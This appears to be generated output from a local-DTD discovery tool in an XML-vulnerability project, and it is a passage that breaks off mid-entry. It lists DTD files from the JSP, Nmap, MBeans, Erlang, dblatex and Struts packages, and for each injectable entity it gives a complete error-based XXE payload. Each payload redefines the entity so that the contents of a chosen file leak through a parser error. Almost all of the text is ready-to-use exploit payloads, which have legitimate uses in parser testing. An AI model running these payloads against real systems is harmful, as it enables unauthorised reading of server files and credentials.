**Injectable entity:** `UriList`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % UriList '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `URL`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % URL '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `BeanID`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % BeanID '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `TypeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % TypeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `Content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % Content '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `Length`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % Length '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `Pixels`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % Pixels '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `Bool`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % Bool '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `ImgAlign`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % ImgAlign '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `Body`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % Body '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `attr_numeric`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % attr_numeric '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `attr_ipaddr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % attr_ipaddr '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `attr_percent`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % attr_percent '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `attr_type`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % attr_type '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `host_states`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % host_states '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `port_states`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % port_states '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `hostname_types`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % hostname_types '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `scan_types`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % scan_types '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `port_protocols`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % port_protocols '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd`

**Injectable entity:** `service_confs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/nmap/nmap.dtd">

    <!ENTITY % service_confs '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd`

**Injectable entity:** `MethodName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd">

    <!ENTITY % MethodName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd`

**Injectable entity:** `VariableName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/mbeans-descriptors.dtd">

    <!ENTITY % VariableName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/application.dtd`

**Injectable entity:** `common`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/application.dtd">

    <!ENTITY % common '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/common.dtd`

**Injectable entity:** `common.entities`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/common.dtd">

    <!ENTITY % common.entities '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/common.entities.dtd`

**Injectable entity:** `ISOlat1`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/common.entities.dtd">

    <!ENTITY % ISOlat1 '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/xhtml1-strict.dtd`

**Injectable entity:** `HTMLlat1`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/erlang/xhtml1-strict.dtd">

    <!ENTITY % HTMLlat1 '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/dblatex-config.dtd`

**Injectable entity:** `attlist.modname`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/dblatex-config.dtd">

    <!ENTITY % attlist.modname '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/dblatex-config.dtd`

**Injectable entity:** `attlist.filepath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/dblatex-config.dtd">

    <!ENTITY % attlist.filepath '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/dblatex-config.dtd`

**Injectable entity:** `attlist.mod_or_file`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/dblatex-config.dtd">

    <!ENTITY % attlist.mod_or_file '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
